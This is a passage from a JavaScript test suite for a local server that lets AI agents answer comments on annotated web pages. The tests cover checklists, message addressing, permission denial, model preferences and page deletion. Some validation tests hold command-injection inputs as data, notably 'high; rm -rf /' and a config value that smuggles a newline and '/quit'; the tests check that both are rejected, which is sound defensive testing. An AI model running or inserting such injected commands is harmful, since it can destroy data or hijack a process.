    const url = 'https://docs.google.test/document/d/huge/edit';
    await POST(base, '/page', { url, title: 'Huge Doc', site: 'docs.google.test' });
    const r = await POST(base, '/reply', {
      url, thread_id: '__page__', text: '@claude have a look',
      docx_b64: Buffer.alloc(8 * 1024 * 1024 + 1024).toString('base64'),
    });
    assert.equal(r.status, 413);
    assert.equal(r.json.ok, false);
    const page = (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json;
    assert.deepEqual(page.page_chat, [], 'a refused request leaves no message behind');
  });

  // --- ticking a checklist -----------------------------------------------
  const TICK_URL = 'https://ledger.test/2026/checklist';
  const TICK_TEXT = [
    'Three things worth doing:',
    '- [ ] check the load factor',
    '  * [ ] find a source for the 2019 figure',
    '1. [ ] email the operator',
    '',
    'Note: - [ ] mid-line boxes are prose, not items.',
  ].join('\n');
  let tickTs = '';
  await test('POST /tick toggles a bot checklist in every marker style', async () => {
    process.env.BOTFERENCE_PROJECT_ROOT = root;
    const store = await import('../store.mjs');
    const page = store.blankPage({ url: TICK_URL, title: 'Checklist', site: 'ledger.test' });
    tickTs = new Date().toISOString();
    // authored by a BOT: ticking someone else's checklist is the whole point
    page.page_chat = [{ author: 'claude', ts: tickTs, text: TICK_TEXT }];
    store.savePage(page);

    const tick = (index, checked) => POST(base, '/tick',
      { url: TICK_URL, thread_id: '__page__', ts: tickTs, index, checked });
    // the expected text, byte-for-byte, with the given LINES ticked
    const marked = (...lines) => TICK_TEXT.split('\n')
      .map((l, n) => (lines.includes(n) ? l.replace('[ ]', '[x]') : l)).join('\n');

    const a = await tick(0, true);
    assert.equal(a.json.ok, true);
    assert.equal(a.json.text, marked(1), 'the dash item, and nothing else');
    assert.equal((await tick(1, true)).json.text, marked(1, 2), 'the indented star item');
    const c = await tick(2, true);
    assert.equal(c.json.text, marked(1, 2, 3), 'the numbered item');
    assert.ok(c.json.text.includes('Note: - [ ] mid-line boxes are prose'),
      'a mid-line box is not a list item and is left alone');
    const back = await tick(0, false);
    assert.equal(back.json.text, marked(2, 3), 'and it unticks');
    const stored = (await GET(base, `/page?url=${encodeURIComponent(TICK_URL)}`)).json;
    assert.equal(stored.page_chat[0].text, back.json.text, 'the ticked text is on disk');
    assert.equal(stored.page_chat[0].author, 'claude', 'and it is still the bot\'s message');
  });

  await test('POST /tick refuses an unknown message and an index off the end', async () => {
    const bad = [
      [{ url: TICK_URL, thread_id: '__page__', ts: 'not-a-ts', index: 0, checked: true }, 404],
      [{ url: TICK_URL, thread_id: 't-nope', ts: tickTs, index: 0, checked: true }, 404],
      [{ url: 'https://ledger.test/2026/never-seen', ts: tickTs, index: 0, checked: true }, 404],
      [{ url: TICK_URL, thread_id: '__page__', ts: tickTs, index: 3, checked: true }, 400],
      [{ url: TICK_URL, thread_id: '__page__', ts: tickTs, index: -1, checked: true }, 400],
      [{ url: TICK_URL, thread_id: '__page__', ts: tickTs, checked: true }, 400],
    ];
    for (const [body, status] of bad) {
      const r = await POST(base, '/tick', body);
      assert.equal(r.status, status, JSON.stringify(body));
      assert.equal(r.json.ok, false);
    }
  });

  await test('POST /tick works in an anchored thread and broadcasts the page', async () => {
    const url = 'https://ledger.test/2026/thread-checklist';
    const t = (await POST(base, '/thread', {
      url, quote: 'a passage', prefix: '', suffix: '', msg: { text: 'plan:\n- [ ] one\n- [ ] two' },
    })).json.thread;
    const before = stream.events.length;
    const r = await POST(base, '/tick',
      { url, thread_id: t.id, ts: t.msgs[0].ts, index: 1, checked: true });
    assert.equal(r.json.text, 'plan:\n- [ ] one\n- [x] two');
    await waitFor(() => stream.events.slice(before).some(e => e.type === 'page' && e.url === url),
      'page invalidation after a tick');
  });

  // --- addressing a message: ts + discriminators --------------------------
  // The companion stamps whole milliseconds, so a timestamp names a message
  // only by luck. These build the collisions that really happen — a bot's
  // tools summary beside its answer, two bots answering in the same tick —
  // straight into the record, and check that a save, a tick or a delete lands
  // where the reader pointed.
  const sameMs = async (url, msgs) => {
    process.env.BOTFERENCE_PROJECT_ROOT = root;
    const store = await import('../store.mjs');
    const page = store.blankPage({ url, title: 'Same Millisecond', site: 'ledger.test' });
    page.page_chat = msgs;
    store.savePage(page);
    return page;
  };
  const chatOf = async url =>
    (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json.page_chat;

  await test('a tools summary and the answer share a ts: /edit and /tick take the answer', async () => {
    const me = (await GET(base, '/whoami')).json.handle;
    const url = 'https://ledger.test/2026/tools-collision';
    const ts = new Date().toISOString();
    await sameMs(url, [
      { author: me, ts, kind: 'tools', text: 'Explored · 2 steps\n- [ ] not this box' },
      { author: me, ts, text: 'the answer\n- [ ] the real box' },
    ]);
    const ticked = await POST(base, '/tick',
      { url, thread_id: '__page__', ts, index: 0, checked: true, author: me });
    assert.equal(ticked.json.text, 'the answer\n- [x] the real box', 'the answer was ticked');
    assert.ok(!('ambiguous' in ticked.json), 'the tools/answer split is not a tie');
    const edited = await POST(base, '/edit',
      { url, thread_id: '__page__', ts, text: 'revised answer', author: me });
    assert.equal(edited.json.msg.text, 'revised answer');
    let chat = await chatOf(url);
    assert.equal(chat[0].text, 'Explored · 2 steps\n- [ ] not this box', 'the tools row is untouched');
    assert.equal(chat[1].text, 'revised answer');
    // and kind:"tools" is how you ask for the other one on purpose
    const onTools = await POST(base, '/edit',
      { url, thread_id: '__page__', ts, text: 'Explored · 3 steps', author: me, kind: 'tools' });
    assert.equal(onTools.json.msg.kind, 'tools');
    chat = await chatOf(url);
    assert.equal(chat[0].text, 'Explored · 3 steps');
    assert.equal(chat[1].text, 'revised answer', 'the answer stayed put');
  });

  await test('author steers between two authors stamped the same millisecond', async () => {
    const url = 'https://ledger.test/2026/two-bots-one-ms';
    const ts = new Date().toISOString();
    const fresh = () => sameMs(url, [
      { author: 'claude', ts, text: 'claude:\n- [ ] claude box' },
      { author: 'codex', ts, text: 'codex:\n- [ ] codex box' },
    ]);
    await fresh();
    const r = await POST(base, '/tick',
      { url, thread_id: '__page__', ts, index: 0, checked: true, author: 'codex' });
    assert.equal(r.json.text, 'codex:\n- [x] codex box');
    let chat = await chatOf(url);
    assert.equal(chat[0].text, 'claude:\n- [ ] claude box', 'the other bot was not touched');
    // an unknown name is no reason to refuse: the ts still names a message
    const stray = await POST(base, '/tick',
      { url, thread_id: '__page__', ts, index: 0, checked: true, author: 'gemini' });
    assert.equal(stray.status, 200);
    assert.equal(stray.json.ambiguous, true, 'nothing narrowed it, so say so');

    await fresh();
    await POST(base, '/delete', { url, thread_id: '__page__', ts, author: 'claude' });
    chat = await chatOf(url);
    assert.deepEqual(chat.map(m => m.author), ['codex'], 'the named message went, alone');
  });

  await test('an unbreakable tie resolves to the first message and says ambiguous', async () => {
    const url = 'https://ledger.test/2026/true-tie';
    const ts = new Date().toISOString();
    await sameMs(url, [
      { author: 'claude', ts, text: 'first:\n- [ ] a' },
      { author: 'claude', ts, text: 'second:\n- [ ] b' },
    ]);
    const r = await POST(base, '/tick',
      { url, thread_id: '__page__', ts, index: 0, checked: true, author: 'claude' });
    assert.equal(r.json.ambiguous, true, 'the client can warn instead of trusting it');
    assert.equal(r.json.text, 'first:\n- [x] a', 'and the first is the one that moved');
    const chat = await chatOf(url);
    assert.equal(chat[1].text, 'second:\n- [ ] b');
  });

  await test('a legacy payload with no author or kind behaves exactly as before', async () => {
    const me = (await GET(base, '/whoami')).json.handle;
    const url = 'https://ledger.test/2026/legacy-payload';
    const ts = new Date().toISOString();
    const other = new Date(Date.now() + 1000).toISOString();
    await sameMs(url, [
      { author: me, ts, text: 'mine\n- [ ] box' },
      { author: 'claude', ts: other, text: 'the bot\'s' },
    ]);
    const ticked = await POST(base, '/tick',
      { url, thread_id: '__page__', ts, index: 0, checked: true });
    assert.equal(ticked.json.text, 'mine\n- [x] box');
    assert.ok(!('ambiguous' in ticked.json), 'a unique ts is never ambiguous');
    const edited = await POST(base, '/edit', { url, thread_id: '__page__', ts, text: 'mine, revised' });
    assert.equal(edited.json.msg.text, 'mine, revised');
    assert.ok(!('ambiguous' in edited.json));
    // still the bots' words, still refused, with nothing on the wire but a ts
    const denied = await POST(base, '/edit', { url, thread_id: '__page__', ts: other, text: 'nope' });
    assert.equal(denied.status, 403);
    const gone = await POST(base, '/delete', { url, thread_id: '__page__', ts: other });
    assert.equal(gone.json.ok, true);
    assert.deepEqual((await chatOf(url)).map(m => m.text), ['mine, revised']);
  });

  await test('a same-ms bot answer is safe from the owner\'s own edit and delete', async () => {
    const me = (await GET(base, '/whoami')).json.handle;
    const url = 'https://ledger.test/2026/mine-and-theirs';
    const ts = new Date().toISOString();
    await sameMs(url, [
      { author: 'claude', ts, text: 'the bot answered' },
      { author: me, ts, text: 'and I typed at the same instant' },
    ]);
    // no author on the wire: /edit and /delete may only touch yours anyway, so
    // yours is the tie-breaker — this used to 403 on the bot's message
    const edited = await POST(base, '/edit', { url, thread_id: '__page__', ts, text: 'my words, revised' });
    assert.equal(edited.status, 200);
    assert.equal(edited.json.msg.author, me);
    // /delete is different: the owner may retract a bot's reply on purpose, so
    // there is no implicit "mine" — the row's author is what points it
    const mine = await POST(base, '/delete', { url, thread_id: '__page__', ts, author: me });
    assert.ok(!('ambiguous' in mine.json), 'the author settled it');
    assert.deepEqual((await chatOf(url)).map(m => m.author), ['claude'], 'the bot\'s answer survived');
    const theirs = await POST(base, '/delete', { url, thread_id: '__page__', ts, author: 'claude' });
    assert.equal(theirs.json.ok, true);
    assert.deepEqual(await chatOf(url), [], 'and the owner can still take the bot\'s away');
  });

  // --- file writing is off ------------------------------------------------
  await test('a permission request is denied at once and reported in the thread', async () => {
    const url = 'https://ledger.test/2026/permission';
    await POST(base, '/page', { url, title: 'Permission', site: 'ledger.test' });
    const before = stream.events.length;
    const responsesBefore = allLines(logFile).filter(e => e.type === 'permission_response').length;
    const t = (await POST(base, '/thread', {
      url, quote: 'worth writing up', prefix: '', suffix: '',
      msg: { text: '@claude write this up for me [mock:perm]' },
    })).json.thread;
    // "at once": with the old 120s timer this wait would expire
    await waitFor(() => allLines(logFile).filter(e => e.type === 'permission_response').length > responsesBefore,
      'an immediate answer', 2000);
    const answer = allLines(logFile).filter(e => e.type === 'permission_response').pop();
    assert.equal(answer.allow, false, 'every permission request is denied');
    const err = await waitFor(() => stream.events.slice(before)
      .find(e => e.type === 'chat' && e.kind === 'error'), 'the thread is told');
    assert.equal(err.url, url);
    assert.equal(err.target, t.id);
    assert.equal(err.error, 'claude asked to write a file — file-writing is disabled in the annotator');
    await waitFor(() => stream.events.slice(before)
      .some(e => e.kind === 'turn-end' && e.url === url), 'the turn still ends');
    const page = (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json;
    assert.equal(page.threads[0].msgs.length, 2, 'and the reply still lands');
  });

  // --- reasoning effort ---------------------------------------------------
  await test('POST /effort queues the control turn and updates the picker', async () => {
    // the earlier tests left turns running; a control turn only proves it is
    // silent once nothing else is talking
    await waitFor(async () => (await GET(base, '/health')).json.queue === 0, 'the bridge to go idle');
    const before = stream.events.length;
    const sentBefore = inputs(logFile).length;
    const r = await POST(base, '/effort', { agent: 'claude', level: 'xhigh' });
    assert.deepEqual(r.json, { ok: true, queued: true, applies: 'now' });
    await waitFor(() => inputs(logFile).length > sentBefore, 'effort at the bridge');
    assert.deepEqual(inputs(logFile).slice(sentBefore), ['/effort @claude xhigh']);
    const ev = await waitFor(() => stream.events.slice(before)
      .find(e => e.type === 'models' && e.effort.current.claude === 'xhigh'), 'models event');
    assert.equal(ev.effort.current.codex, null, 'codex is untouched and still unknown');
    assert.equal(ev.verbosity, 'short', 'the panel event carries verbosity too');
    assert.equal(stream.events.slice(before).filter(e => e.type === 'chat').length, 0,
      'a control turn is not a page turn');
    assert.equal((await GET(base, '/models')).json.effort.current.claude, 'xhigh');
    const n = inputs(logFile).length;
    assert.equal((await POST(base, '/effort', { agent: 'codex', level: 'minimal' })).json.ok, true);
    await waitFor(() => inputs(logFile).length > n, 'codex effort');
    assert.deepEqual(inputs(logFile).slice(n), ['/effort @codex minimal']);
    await waitFor(async () => (await GET(base, '/models')).json.effort.current.codex === 'minimal',
      'codex effort recorded');
  });

  // The complaint this answers: the pickers used to be dead until the agents
  // were awake, so the one moment you most want to choose a model — before the
  // first message — was the one moment you could not. Model and effort are
  // preferences the companion keeps; the bridge is told at every wake.
  await test('a model and an effort chosen before the agents have ever run are kept, and imposed at the first wake', async () => {
    const coldRoot = tmpRoot('prefs');
    const coldLog = path.join(coldRoot, 'bridge-log.jsonl');
    const cold = await startServer({
      root: coldRoot,
      env: {
        PLUGIN_BRIDGE_CMD: JSON.stringify([process.execPath, MOCK]),
        MOCK_BRIDGE_LOG: coldLog,
        PLUGIN_SID_WAIT_MS: '600',
      },
    });
    const url = 'https://ledger.test/2026/cold-prefs';
    assert.equal((await GET(cold.base, '/health')).json.bridge, 'stopped', 'nothing has summoned it');

    // no bridge has ever run here, so there are no lists to check against: the
    // companion stores what it is given and lets the bridge refuse at wake
    const m = await POST(cold.base, '/model', { agent: 'claude', model: 'claude-opus-5' });
    assert.deepEqual(m.json, { ok: true, queued: false, applies: 'at-wake' });
    const e = await POST(cold.base, '/effort', { agent: 'codex', level: 'max' });
    assert.deepEqual(e.json, { ok: true, queued: false, applies: 'at-wake' });
    assert.equal(fs.existsSync(coldLog), false, 'a preference must not wake the agents to store it');
    assert.equal((await GET(cold.base, '/health')).json.bridge, 'stopped');

    // and the picker reads them straight back, with the agents still asleep
    const models = (await GET(cold.base, '/models')).json;
    assert.equal(models.bridge, 'stopped');
    assert.equal(models.current.claude, 'claude-opus-5');
    assert.equal(models.effort.current.codex, 'max');
    assert.equal(models.effort.current.claude, 'high', "the child's own default, still");
    const cfg = JSON.parse(fs.readFileSync(
      path.join(coldRoot, '.botference', 'plugin', 'config.json'), 'utf8'));
    assert.deepEqual(cfg.agents.model, { claude: 'claude-opus-5', codex: null });
    assert.deepEqual(cfg.agents.effort, { claude: null, codex: 'max' });

    // now wake it with a real comment: the preferences go in FIRST, so the very
    // turn that woke the bridge is already answered under them
    await POST(cold.base, '/page', { url, title: 'Cold Prefs', site: 'ledger.test' });
    await POST(cold.base, '/reply', { url, thread_id: '__page__', text: '@claude first thing I ask' });
    const sent = await waitFor(() => {
      const all = fs.existsSync(coldLog) ? inputs(coldLog) : [];
      return all.some(t => t.startsWith('@claude ')) ? all : null;
    }, 'the user turn to reach the bridge');
    assert.deepEqual(sent.slice(0, 2),
      ['/model @claude claude-opus-5', '/effort @codex max'],
      'both preferences, before anything else the turn needed');
    assert.ok(sent.indexOf('/project create Plugin pages') > 1, 'the bootstrap still happens, after them');
    assert.ok(sent.findIndex(t => t.startsWith('@claude ')) > sent.indexOf('/effort @codex max'),
      'and the user turn is answered with them already in force');

    // the page still got its own session out of the same wake: preferences ride
    // ahead of the choreography without disturbing it
    await waitFor(async () => {
      const page = (await GET(cold.base, `/page?url=${encodeURIComponent(url)}`)).json;
      return page && page.session_id ? page : null;
    }, "the page's own session id");
    // …and waking taught the companion the lists, so the pickers work next time
    const after = JSON.parse(fs.readFileSync(
      path.join(coldRoot, '.botference', 'plugin', 'config.json'), 'utf8'));
    assert.deepEqual(after.agents.effort_options.codex, ['minimal', 'low', 'medium', 'high', 'max']);
    cold.proc.kill();
  });

  await test('a preference that a hand-edited config turned into a second command is never sent', async () => {
    const evilRoot = tmpRoot('evilprefs');
    const dir = path.join(evilRoot, '.botference', 'plugin');
    fs.mkdirSync(dir, { recursive: true });
    // config.json is a file a human can edit, and every value in it is
    // interpolated into a slash command on the bridge's stdin
    fs.writeFileSync(path.join(dir, 'config.json'), JSON.stringify({
      agents: {
        model: { claude: 'claude-opus-5\n/quit', codex: 'gpt-5.5' },
        effort: { claude: { not: 'a string' }, codex: 'high' },
        model_options: 'not a list',
      },
    }));
    const evilLog = path.join(evilRoot, 'bridge-log.jsonl');
    const evil = await startServer({
      root: evilRoot,
      env: { PLUGIN_BRIDGE_CMD: JSON.stringify([process.execPath, MOCK]), MOCK_BRIDGE_LOG: evilLog },
    });
    const url = 'https://ledger.test/2026/evil-prefs';
    const models = (await GET(evil.base, '/models')).json;
    assert.equal(models.current.claude, null, 'the smuggled newline is not a model');
    assert.equal(models.current.codex, 'gpt-5.5', 'the honest one beside it still is');
    assert.equal(models.effort.current.claude, 'high', 'a non-string effort falls back to the default');
    assert.equal(models.options, null, 'a list that is not a list is no list at all');

    await POST(evil.base, '/page', { url, title: 'Evil Prefs', site: 'ledger.test' });
    await POST(evil.base, '/reply', { url, thread_id: '__page__', text: '@claude anything' });
    const sent = await waitFor(() => {
      const all = fs.existsSync(evilLog) ? inputs(evilLog) : [];
      return all.some(t => t.startsWith('@claude ')) ? all : null;
    }, 'the user turn to reach the bridge');
    assert.ok(!sent.some(t => t.includes('/quit')), 'nothing ever sent /quit');
    assert.deepEqual(sent.slice(0, 2), ['/model @codex gpt-5.5', '/effort @codex high'],
      'only the values that survived normalisation were imposed');
    evil.proc.kill();
  });

  await test('POST /effort refuses a bad agent and a level the bridge never offered', async () => {
    const bad = [
      { agent: 'gemini', level: 'high' },
      { agent: 'claude', level: 'high; rm -rf /' },
      { agent: 'claude', level: 'minimal' }, // a codex level, not a claude one
      { agent: 'codex', level: 'xhigh' },
    ];
    for (const body of bad) {
      const r = await POST(base, '/effort', body);
      assert.equal(r.status, 400, JSON.stringify(body));
      assert.equal(r.json.ok, false);
    }
  });

  // --- reply length -------------------------------------------------------
  await test('POST /verbosity persists, broadcasts, and changes the next envelope', async () => {
    const cfgFile = path.join(root, '.botference', 'plugin', 'config.json');
    const before = stream.events.length;
    const r = await POST(base, '/verbosity', { level: 'long' });
    assert.deepEqual(r.json, { ok: true, verbosity: 'long' });
    assert.equal(JSON.parse(fs.readFileSync(cfgFile, 'utf8')).verbosity, 'long', 'written to config.json');
    const ev = await waitFor(() => stream.events.slice(before)
      .find(e => e.type === 'models' && e.verbosity === 'long'), 'models broadcast');
    assert.ok(ev.effort, 'the broadcast carries the whole panel');
    assert.equal((await GET(base, '/models')).json.verbosity, 'long');

    let from = inputs(logFile).length;
    await POST(base, '/reply', { url: PAGE1, thread_id: '__page__', text: '@claude at length please' });
    const long = await waitFor(() => inputs(logFile).slice(from)
      .find(t => t.startsWith('@claude ')), 'the long turn');
    assert.ok(long.endsWith(LEN_LONG));
    assert.ok(!long.includes('crisp sentences'), 'one length instruction, never two');

    assert.equal((await POST(base, '/verbosity', { level: 'short' })).json.verbosity, 'short');
    from = inputs(logFile).length;
    await POST(base, '/reply', { url: PAGE1, thread_id: '__page__', text: '@claude briefly then' });
    const short = await waitFor(() => inputs(logFile).slice(from)
      .find(t => t.startsWith('@claude ')), 'the short turn');
    assert.ok(short.endsWith(LEN_SHORT));
    const bad = await POST(base, '/verbosity', { level: 'epic' });
    assert.equal(bad.status, 400);
    assert.equal(JSON.parse(fs.readFileSync(cfgFile, 'utf8')).verbosity, 'short', 'a refusal changes nothing');
  });

  // --- the library: one conversation about the whole archive ---------------
  // Not a new kind of thing: a page record under a reserved url, so /reply,
  // the event stream, the index, export and delete-page all work on it as they
  // work on anything else. What is its own is the turn it sends.
  const LIB = 'bfp://library';
  await test('the library is created by the first thing said in it, with a session of its own', async () => {
    assert.deepEqual((await GET(base, `/page?url=${encodeURIComponent(LIB)}`)).json, { ok: true, page: null },
      'nothing exists until somebody asks something');
    const from = inputs(logFile).length;
    const r = await POST(base, '/reply',
      { url: LIB, thread_id: '__page__', text: '@claude what have I been reading about, across everything?' });
    assert.equal(r.status, 200);
    assert.equal(r.json.queued, true);

    const sent = await waitFor(() => {
      const all = inputs(logFile).slice(from);
      return all.some(t => t.includes('across everything')) ? all : null;
    }, 'the library turn');
    assert.ok(sent.includes('/new'), 'the library gets a chat of its own');
    assert.ok(sent.includes('/rename Library'), '…named Library, not after a url');

    const turn = sent.find(t => t.includes('across everything'));
    assert.ok(turn.startsWith('@claude '), 'routing is the ordinary routing');
    assert.ok(turn.includes('[the library: everything the reader has annotated]'));
    assert.ok(turn.includes(path.join(root, '.botference', 'plugin')),
      'the archive is named absolutely — the CLIs run with a different cwd');
    assert.ok(turn.includes('pages/*.json') && turn.includes('snapshots/<key>.html'),
      'both halves of the archive');
    assert.ok(/threads:\[\{quote, msgs:\[\{author, ts, text\}\], resolved, summary\}\]/.test(turn),
      'and the shape of what is inside them');
    assert.ok(/resolved` set is one the reader\s+has marked handled/.test(turn),
      '…including what a resolved thread means, so the archive is not read as all-open');
    assert.ok(/Never write, create or edit a file here/.test(turn), 'reads only, said in the turn itself');
    assert.ok(!turn.includes('[web page:'), 'no page context, because there is no page');
    assert.ok(turn.endsWith(LEN_SHORT),
      "the reader's length instruction still has the last word");

    const page = await waitFor(async () => {
      const p = (await GET(base, `/page?url=${encodeURIComponent(LIB)}`)).json;
      return p && p.session_id && (p.page_chat || []).length > 1 ? p : null;
    }, 'the library session and its answer');
    assert.equal(page.title, 'Library');
    assert.deepEqual(page.page_chat.map(m => m.author), ['angadh', 'claude'],
      'the question is the reader\'s, the answer is the bot\'s');
    const pagesDir = path.join(root, '.botference', 'plugin', 'pages');
    const owners = fs.readdirSync(pagesDir)
      .map(f => JSON.parse(fs.readFileSync(path.join(pagesDir, f), 'utf8')))
      .filter(p => p.session_id === page.session_id);
    assert.equal(owners.length, 1, 'and no other page inherited that session');
    // it is an ordinary record on disk and in the index
    assert.ok(fs.existsSync(path.join(root, '.botference', 'plugin', 'pages',
      `${crypto.createHash('sha1').update(LIB).digest('hex')}.json`)));
    const row = (await GET(base, '/index')).json[crypto.createHash('sha1').update(LIB).digest('hex')];
    assert.equal(row.title, 'Library');
    assert.equal(row.has_session, true);
  });

  await test('a second question resumes the library rather than starting a new chat', async () => {
    const from = inputs(logFile).length;
    await POST(base, '/reply', { url: LIB, thread_id: '__page__', text: '@claude and what did I disagree with?' });
    const sent = await waitFor(() => {
      const all = inputs(logFile).slice(from);
      return all.some(t => t.includes('disagree with')) ? all : null;
    }, 'the second library turn');
    assert.equal(sent.filter(t => t === '/new').length, 0, 'no second chat for the same conversation');
    const turn = sent.find(t => t.includes('disagree with'));
    assert.ok(turn.includes('Earlier in this conversation:'), 'the first exchange rides along');
    assert.ok(turn.includes('what have I been reading about'), '…verbatim');
  });

  await test('the library exports as a note of its own', async () => {
    const r = await POST(base, '/export', { url: LIB, mode: 'comments' });
    assert.equal(r.status, 200);
    assert.equal(r.json.mode, 'all',
      'there is no reading to separate the conversation from, so "comments only" is not on offer');
    const note = fs.readFileSync(r.json.path, 'utf8');
    assert.match(note, /^# Library$/m);
    assert.match(note, /^## Library chat$/m, 'not "page chat" — there is no page');
    assert.match(note, /url: bfp:\/\/library/);
    assert.match(note, /across everything/);
  });

  await test('clearing the library is deleting its page, and asking again starts a fresh one', async () => {
    const r = await POST(base, '/delete-page', { url: LIB, delete_session: true });
    assert.equal(r.json.ok, true);
    assert.equal(r.json.session_deleted, true);
    assert.deepEqual((await GET(base, `/page?url=${encodeURIComponent(LIB)}`)).json, { ok: true, page: null });
    await POST(base, '/reply', { url: LIB, thread_id: '__page__', text: 'starting over, no bots' });
    const back = (await GET(base, `/page?url=${encodeURIComponent(LIB)}`)).json;
    assert.equal(back.title, 'Library');
    assert.deepEqual(back.page_chat.map(m => m.text), ['starting over, no bots']);
    assert.equal(back.session_id, null, 'a cleared library is a new conversation, not the old one');
  });

  // --- forgetting a page --------------------------------------------------
  await test('the index says which pages have a bot chat', async () => {
    const idx = (await GET(base, '/index')).json;
    assert.equal(idx[crypto.createHash('sha1').update(PAGE1).digest('hex')].has_session, true);
    assert.equal(idx[crypto.createHash('sha1').update(TICK_URL).digest('hex')].has_session, false);
  });

  await test('POST /delete-page forgets the page and asks a running bridge to delete the chat', async () => {
    const url = 'https://ledger.test/2026/regretted';
    await POST(base, '/page', { url, title: 'Regretted', site: 'ledger.test' });
    await POST(base, '/thread', {
      url, quote: 'a thing said', prefix: '', suffix: '', msg: { text: '@claude thoughts?' },
    });
    const sid = (await waitFor(async () => {
      const p = (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json;
      return p.session_id ? p : null;
    }, 'sid capture on the regretted page')).session_id;

    const before = stream.events.length;
    const sentBefore = inputs(logFile).length;
    const r = await POST(base, '/delete-page', { url, delete_session: true });
    assert.deepEqual(r.json, { ok: true, session_deleted: true });
    await waitFor(() => inputs(logFile).slice(sentBefore).includes(`/delete ${sid}`), '/delete at the bridge');
    // the controller confirms deletions through a picker; nobody is at a
    // keyboard, so the companion must answer it
    const choice = await waitFor(() => allLines(logFile).filter(e => e.type === 'choice_response').pop(),
      'the confirm answered');
    assert.equal(choice.index, 0, 'confirmed, not cancelled');
    await waitFor(() => stream.events.slice(before).some(e => e.type === 'page' && e.url === url),
      'page invalidation');
    assert.equal((await GET(base, `/page?url=${encodeURIComponent(url)}`)).json.page, null);
    assert.equal((await GET(base, '/index')).json[crypto.createHash('sha1').update(url).digest('hex')], undefined);
    assert.equal(fs.existsSync(path.join(root, '.botference', 'plugin', 'pages',
      `${crypto.createHash('sha1').update(url).digest('hex')}.json`)), false, 'the record is gone from disk');
  });

  await test('with the bridge stopped the session file is deleted from the work dir', async () => {
    const stopRoot = tmpRoot('delstop');
    const sessions = path.join(stopRoot, 'work', 'sessions');
    fs.mkdirSync(sessions, { recursive: true });
    fs.writeFileSync(path.join(sessions, 'sess-orphan.json'), '{"session_id":"sess-orphan"}');
    const stop = await startServer({
      root: stopRoot, env: { PLUGIN_BRIDGE_CMD: JSON.stringify([process.execPath, MOCK]) },
    });
    const url = 'https://ledger.test/2026/cold-delete';
    const key = crypto.createHash('sha1').update(url).digest('hex');
    const file = path.join(stopRoot, '.botference', 'plugin', 'pages', `${key}.json`);
    await POST(stop.base, '/page', { url, title: 'Cold Delete', site: 'ledger.test' });
    const rec = JSON.parse(fs.readFileSync(file, 'utf8'));
    rec.session_id = 'sess-orphan';
    fs.writeFileSync(file, JSON.stringify(rec));

    assert.equal((await GET(stop.base, '/health')).json.bridge, 'stopped', 'nothing has summoned it');
    const r = await POST(stop.base, '/delete-page', { url, delete_session: true });
    assert.deepEqual(r.json, { ok: true, session_deleted: true });
    assert.equal(fs.existsSync(path.join(sessions, 'sess-orphan.json')), false, 'the chat is gone');
    assert.equal(fs.existsSync(file), false);
    assert.equal((await GET(stop.base, '/health')).json.bridge, 'stopped', 'and no bridge was started for it');

    // a page with no session at all, and a session file that never existed
    await POST(stop.base, '/page', { url: `${url}-2`, title: 'Cold Delete 2', site: 'ledger.test' });
    const plain = await POST(stop.base, '/delete-page', { url: `${url}-2`, delete_session: true });
    assert.deepEqual(plain.json, { ok: true, session_deleted: false });
    assert.equal((await POST(stop.base, '/delete-page', { url })).status, 404, 'gone means gone');
    stop.proc.kill();
  });

  await test('a session two pages claim is never deleted', async () => {
    const sharedRoot = tmpRoot('shared');
    const shared = await startServer({ root: sharedRoot });
    const urls = ['https://ledger.test/2026/twin-a', 'https://ledger.test/2026/twin-b'];
    for (const u of urls) {
      await POST(shared.base, '/page', { url: u, title: `Twin ${u.slice(-1)}`, site: 'ledger.test' });
      const f = path.join(sharedRoot, '.botference', 'plugin', 'pages',
        `${crypto.createHash('sha1').update(u).digest('hex')}.json`);
      const rec = JSON.parse(fs.readFileSync(f, 'utf8'));
      rec.session_id = 'sess-shared';
      fs.writeFileSync(f, JSON.stringify(rec));
    }
    const r = await POST(shared.base, '/delete-page', { url: urls[0], delete_session: true });
    assert.equal(r.status, 409);
    assert.match(r.json.error, /also claimed by/);
    assert.ok((await GET(shared.base, `/page?url=${encodeURIComponent(urls[0])}`)).json.url,
      'the page survives a refused delete');
    // the page alone can still go; the chat behind it is what was protected
    const keep = await POST(shared.base, '/delete-page', { url: urls[0] });
    assert.deepEqual(keep.json, { ok: true, session_deleted: false });
    assert.equal((await GET(shared.base, `/page?url=${encodeURIComponent(urls[0])}`)).json.page, null);
    shared.proc.kill();
  });

  // --- which python, and there was more than one answer -------------------
  // The bug: two features each invented an env var for "the interpreter", and
  // neither read the other's. A reader on a venv who exported
  // BOTFERENCE_PYTHON_BIN got the bridge on their python and every /run block
  // on the system's, silently. Both names are read in both places now.
  {
    const run = await import(path.join(PLUGIN_DIR, 'run.mjs'));
    const saved = [process.env.PLUGIN_PYTHON, process.env.BOTFERENCE_PYTHON_BIN];
    const set = (a, b) => {
      if (a === undefined) delete process.env.PLUGIN_PYTHON; else process.env.PLUGIN_PYTHON = a;
      if (b === undefined) delete process.env.BOTFERENCE_PYTHON_BIN;
      else process.env.BOTFERENCE_PYTHON_BIN = b;
    };

    await test('pythonBin: neither set is the system python', () => {
      set(undefined, undefined);
      assert.equal(run.pythonBin(), 'python3');
    });
    await test('pythonBin: either name alone is honoured', () => {
      set('/venv/bin/python', undefined);
      assert.equal(run.pythonBin(), '/venv/bin/python');
      set(undefined, '/pyenv/shims/python');
      assert.equal(run.pythonBin(), '/pyenv/shims/python',
        'the bridge\'s variable reaches /run too — this is the bug');
    });
    await test('pythonBin: the local name wins when both are set', () => {
      set('/a/python', '/b/python');
      assert.equal(run.pythonBin(), '/a/python');
    });
    set(saved[0], saved[1]);
  }

  // --- a thread remembers who it is talking to ---------------------------
  // The complaint this answers: tag @claude in the first comment, ask the
  // follow-up without retyping the tag, and the follow-up used to become a
  // note to self. A thread now has an ADDRESS — chat.stickyRoute — and an
  // untagged message in it goes there. Its own server, because these assert on
  // what reached the bridge.
  {
    const chat = await import(path.join(PLUGIN_DIR, 'chat.mjs'));

    await test('stickyRoute: an empty thread is addressed to nobody', () => {
      assert.equal(chat.stickyRoute([]), '');
      assert.equal(chat.stickyRoute(undefined), '');
      assert.equal(chat.stickyRoute([{ author: 'angadh', text: 'a note' }]), '');
    });

    await test('stickyRoute: the reader\'s last tag is the address', () => {
